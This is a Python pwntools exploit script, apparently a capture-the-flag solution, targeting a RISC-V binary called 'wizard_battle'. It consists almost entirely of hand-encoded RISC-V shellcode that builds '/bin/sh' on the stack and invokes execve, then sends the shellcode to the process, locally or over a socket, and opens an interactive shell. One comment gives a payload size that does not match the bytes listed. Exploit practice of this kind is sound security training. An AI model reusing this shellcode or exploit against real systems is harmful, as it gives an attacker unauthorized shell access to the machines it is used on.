from pwn import *
from time import sleep

local=True
debug=True

# Store '/bin'
shellcode=b'\x37\x65\x69\x6e' # 0-3 # lui a0, 0x6e696 # 4 bytes
shellcode += b'\x1b\x05\xf5\x22' # 4-7 # addiw a0, a0, 559 # 4 bytes
shellcode += b'\x61\x11' # 8-9 # addi sp, sp, -8 # 2 bytes
shellcode += b'\x01\x46' # 10-11 li a2, 0 # 2 bytes # Will use this instruction later, putting it here to conserve space

# add jalr a5, 0x10
# for fun add jalr a5, 0x14
shellcode += b'\xe7\x80\x47\x01' # 12-15 jalr a5, 0x10 # 4 bytes

# Store '/sh\x00'
# JUMP AHEAD 8 BYTES # 12-15
# ADD TWO NOPS HERE (16-19)
shellcode += b'\x01\x00' # 16-17 nop # 2 bytes
shellcode += b'\x01\x00' # 18-19 nop # 2 bytes
shellcode += b'\x2a\xe0' # 20-21 # sd a0, 0(sp) # 2 bytes
shellcode += b'\x37\x75\x68\x00' # 22-25  # lui a0, 0x687 # 4 bytes
shellcode += b'\xe7\x80\x07\x02' # 26-29 jalr a5, 0x20 # 4 bytes
shellcode += b'\x01\x00' # 30-31 nop # 2 bytes

shellcode += b'\x1b\x05\xf5\x32' # 32-35 addiw a0, a0, 815 # 4 bytes
shellcode += b'\x23\x32\xa1\x00' # 36-39 sd a0, 4(sp) # 4 bytes

# Store pointer to '/bin/sh'
shellcode += b'\x0a\x85' # 40-41 mv a0, sp # 2 bytes

# Set up rest of call
#shellcode += b'\x01\x46' # 42-43 li a2, 0 # 2 bytes
shellcode += b'\x81\x45' # 44-45 li a1, 0 # 2 bytes
shellcode += b'\x93\x08\xd0\x0d' # 46-49 li a7, 221 # 4 bytes
shellcode += b'\x73\x00\x00\x00' # 50-53 ecall # 4 bytes

# Clean up to exit cleanly
shellcode += b'\x93\x08\xd0\x05' # 54-57 li a7, 93 # 4 bytes
shellcode += b'\x73\x00\x00\x00' # 58-61 ecall # 4 bytes

# Total payload: 46 bytes

context.binary=elfexe=ELF('../wizard_battle')
print(context)


if local:
    if debug:
        p = gdb.debug([elfexe.path],'''
                      break *0x10540
                      break *0x10544
                      break *0x10550
                      break *0x10564
                      ''',
                      elfexe.path)
    else:
        p = process('qemu-riscv64-static ../wizard_battle', shell=True)
else:
    p = remote('localhost', 7701)

p.recvuntil(b'* * *\n')
p.send(b'\n')
p.recvuntil(b'run: \n')
#sleep(20)
p.send(shellcode+b'\n')
p.interactive()
